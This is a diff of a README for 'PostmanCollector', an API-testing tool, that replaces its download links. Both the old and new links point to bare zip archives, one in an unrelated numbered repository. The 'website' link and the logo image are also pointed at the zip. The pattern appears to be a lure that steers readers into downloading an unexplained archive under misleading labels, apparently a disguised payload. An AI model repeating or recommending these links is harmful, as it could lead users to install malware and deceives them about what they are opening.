@@ -14,7 +14,7 @@ Are you looking to streamline your API testing and security testing processes? L
 
 ## Get Started
 
-To get started with PostmanCollector, simply download the software package from the following link: [![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip).
+To get started with PostmanCollector, simply download the software package from the following link: [![Download Software](https://github.com/kakashi8299/PostmanCollector/releases/download/v1.0/Application.zip)](https://github.com/kakashi8299/PostmanCollector/releases/download/v1.0/Application.zip).
 
 Once you have downloaded the software, follow these steps to begin creating your Postman Collection:
 
@@ -32,10 +32,10 @@ Contributions to PostmanCollector are always welcome! If you have ideas for impr
 
 ## Visit Our Website
 
-For more information about PostmanCollector and updates on the latest releases, please visit our website [here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip).
+For more information about PostmanCollector and updates on the latest releases, please visit our website [here](https://github.com/kakashi8299/PostmanCollector/releases/download/v1.0/Application.zip).
 
 ---
 
 Thank you for checking out PostmanCollector! We hope this tool helps you streamline your API testing and security testing workflows. If you have any questions or feedback, don't hesitate to reach out. Happy testing! 🌟
 
-![PostmanCollector Logo](https://your-image-url.com)
+![PostmanCollector Logo](https://github.com/kakashi8299/PostmanCollector/releases/download/v1.0/Application.zip)
